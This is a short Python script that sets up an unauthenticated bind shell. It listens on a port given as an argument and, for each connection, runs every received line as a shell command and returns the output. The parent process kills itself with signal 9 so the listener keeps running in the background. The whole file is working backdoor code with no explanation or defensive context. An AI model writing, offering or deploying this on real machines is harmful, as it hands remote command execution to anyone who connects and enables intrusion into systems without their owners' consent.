#!/usr/bin/python
from sys import argv
import subprocess
import socket
import time
import os
from multiprocessing import Process

def get_input(sock):
    cmd = ""
    while True:
        try:
            char = sock.recv(1)
            if char == '\n':
                break
            cmd += char
        except:
            break
    return cmd


def send_output(sock, output):
    sent = 0
    while sent < len(output):
        try:
            sent += sock.send(output[sent:])
        except:
            pass


def shell_loop(sock):
    send_output(sock, "Connected\n")
    while True:
        cmd = get_input(sock)
        if cmd != "":
            try:
                output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
            except:
                output = "Invalid command: %s" % cmd
            send_output(sock, output)
        time.sleep(0.5)


def start_listener(port):
    sock = socket.socket()
    sock.bind(("", port))
    sock.listen(1)
    sock.setblocking(0)
    while True:
        try:
            conn, addr = sock.accept()
            p = Process(target=shell_loop, args=(conn,))
            p.start()
        except:
            pass


if __name__ == '__main__':
    port = int(argv[1])
    p = Process(target=start_listener, args=(port,))
    p.start()
    os.kill(os.getpid(), 9)
